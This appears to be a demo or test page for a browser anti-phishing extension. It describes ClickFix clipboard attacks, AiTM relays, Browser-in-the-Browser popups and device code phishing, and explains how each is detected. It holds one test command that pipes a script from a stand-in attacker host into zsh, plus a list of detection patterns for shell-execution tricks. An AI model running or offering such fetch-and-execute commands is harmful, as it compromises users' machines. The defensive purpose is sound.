01
Browser-native · Windows
ClickFix — PowerShell Command Copy
Page writes a malicious PowerShell command to clipboard. Email link scans clean. URL has no bad reputation. The attack is in the clipboard payload.
Critical ▼
The Gap
Email filter passes the link. URL scanner shows clean reputation. EDR has no process to scan. The attack payload is clipboard content — invisible to every other layer.
PhishWatch Detection
Hooks clipboard.writeText() in page-world. Analyses the payload per-segment. Detects PowerShell execution patterns before the user pastes. Raw command never leaves the browser.

✓ Expect: PhishWatch overlay fires immediately — "Malicious command detected in clipboard." Fired before the user pastes anything.

02
Browser-native · macOS
ClickFix — Mac Shell Command
Same technique, Mac target. Uses curl|zsh patterns. Homebrew and legitimate install commands are not flagged — only malicious payloads.
Critical ▼
The Gap
Mac EDR watches for process execution. This attack delivers the payload via clipboard — before any process runs. Nothing to scan at delivery time.
PhishWatch Detection
Mac-specific pattern library: curl|zsh, base64 -d|bash, osascript -e. Safe install domains (Homebrew, Docker) excluded per-segment — not as a whole-string exception.
Step 1 — Copy the payload to clipboard
curl -fsSL https://evil.example.com/payload.sh | zsh
✓ Expect: Overlay fires — "Malicious command detected." A Homebrew-only command (brew install ...) would be silent.

03
Adversary-in-the-Middle
AiTM Credential Relay
Login page proxies the real Microsoft login in real time. User completes MFA. Session cookie stolen. URL often scans clean — fresh domain or compromised host.
Critical ▼
The Gap
MFA is bypassed — the relay completes auth on the attacker's behalf and captures the session cookie. URL reputation is clean. Email delivered it without flags.
PhishWatch Detection
Treadmill detection: arms when user focuses a credential field, observes whether a network request exits to a different origin within the window. Detects relay mechanics regardless of domain reputation.
How to test

AiTM detection fires during live credential submission to a cross-origin endpoint. The best way to see this in a demo is a screen recording — the overlay fires when credentials are submitted to a non-matching server. Contact security@phishwatch.io to request a live guided demo session.

✓ Expect: Overlay fires after credential submit — "Login details sent to unexpected server." The cross-origin POST is caught before the session token is handed to the attacker.

04
Visual Deception
Browser-in-the-Browser (BitB)
Fake browser popup drawn entirely in HTML. Looks exactly like a real OAuth window — convincing address bar, close button, correct dimensions. Not a real browser window.
High ▼
The Gap
Security awareness training says "check the address bar." BitB defeats this — the fake bar is drawn by the page, not the browser. No URL scanner or EDR sees a problem.
PhishWatch Detection
Structural DOM analysis: position, dimensions, and visual properties of fixed/absolute elements containing password fields. Class names are irrelevant — the geometry is what gets caught.

05
OAuth Device Code · Storm-2372
Device Code Phishing
Attacker generates a Microsoft device auth code. User pastes it into the real microsoft.com/devicelogin. MFA bypassed, account taken. Named by Microsoft in a March 2026 advisory.
Critical ▼
The Gap
The user pastes the attacker's auth code into the real, legitimate Microsoft page. Email filters, URL scanners, EDR — nothing sees a problem, because there is no problem with the URL or email.
PhishWatch Detection
Detects RFC 8628 device code format pasted into a Microsoft or Google auth page when the user arrived from an external referrer. Fires on the vendor page itself — where the attack actually completes.
